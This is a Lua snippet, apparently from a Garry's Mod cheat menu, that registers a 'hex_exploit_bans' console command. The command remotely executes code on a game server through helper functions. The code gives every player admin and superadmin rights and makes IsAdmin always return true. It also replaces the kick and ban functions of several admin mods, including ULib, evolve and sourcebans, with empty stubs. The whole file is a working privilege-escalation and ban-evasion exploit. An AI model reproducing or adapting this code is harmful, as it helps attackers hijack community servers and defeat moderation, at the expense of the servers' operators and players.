
local function NoBans()
	print("! sending NoBans..\n")
	
	HeXLRCL('replay_tip concommand.Add([[kickid2]],function() end) ')
	HeXLRCL('replay_tip concommand.Add([[banid2]],function() end) ')
	HeXLRCL('replay_tip concommand.Add([[sm_ban]],function() end) ')
	HeXLRCL('replay_tip concommand.Add([[sm_banip]],function() end) ')
	HeXLRCL('replay_tip concommand.Add([[sm_addban]],function() end) ')
	//HeXLRCL('replay_tip concommand.Add([[ev]],function() end) ')
	//HeXLRCL('replay_tip concommand.Add([[ulx]],function() end) ')
	
	RunRun({
		[[ "for k,v in pairs(player.GetAll()) do v:SetUserGroup('admin') end" ]],
		[[ "for k,v in pairs(player.GetAll()) do v:SetUserGroup('superadmin') end" ]],
		
		[[ "_R.Player.IsAdmin = function() return true end" ]],
		[[ "_R.Player.IsSuperAdmin = function() return true end" ]],
		[[ "_R.Player.Ban = function() end" ]],
		[[ "_R.Player.Kick = function() end" ]],
		
		[[ "if cvar2 then cvar2.SetValue('kickid', 0) end" ]],
		[[ "if cvar2 then cvar2.SetValue('banid', 0) end" ]],
		
		[[ "if ULib then ULib.kick = function() end end" ]],
		[[ "if ULib then ULib.ban = function() end end" ]],
		[[ "if ULib then ULib.kickban = function() end end" ]],
		[[ "if ULib then ULib.addBan = function() end end" ]],
		
		[[ "if evolve then evolve.bans = false end" ]],
		[[ "if evolve then evolve.Ban = function() end" ]],
		[[ "if evolve then evolve.IsBanned = function() return false end" ]],
		
		[[ "Cmd_RecvCommand = function() end " ]],
		[[ "BannedPlayers = false" ]],
		[[ "Kick = function() end" ]],
		[[ "Ban = function() end" ]],
		[[ "SaveBans = function() end" ]],
		[[ "KickBan = function() end" ]],
		
		[[ "ASS_BanPlayer = function() end" ]],
		[[ "ASS_KickPlayer = function() end" ]],
		[[ "GBans = {}" ]],
		[[ "if gatekeeper then gatekeeper.Drop = function() end end" ]],
		[[ "if asscmd then asscmd.ConsoleCommand = function() end end" ]],
		
		[[ "sourcebans = {}" ]],
		[[ "sourcebans.doBan = function() end" ]],
		[[ "sourcebans.BanPlayer = function() end" ]],
		[[ "sourcebans.BanPlayerBySteamID = function() end" ]],
		[[ "sourcebans.BanPlayerByIP = function() end" ]],
		[[ "sourcebans.BanPlayerBySteamIDAndIP = function() end" ]],	
		[[ "doBan = function() end" ]],
		[[ "BanPlayer = function() end" ]],
		[[ "BanPlayerBySteamID = function() end" ]],
		[[ "BanPlayerByIP = function() end" ]],
		[[ "BanPlayerBySteamIDAndIP = function() end" ]],
	})
end
concommand.Add("hex_exploit_bans", NoBans)
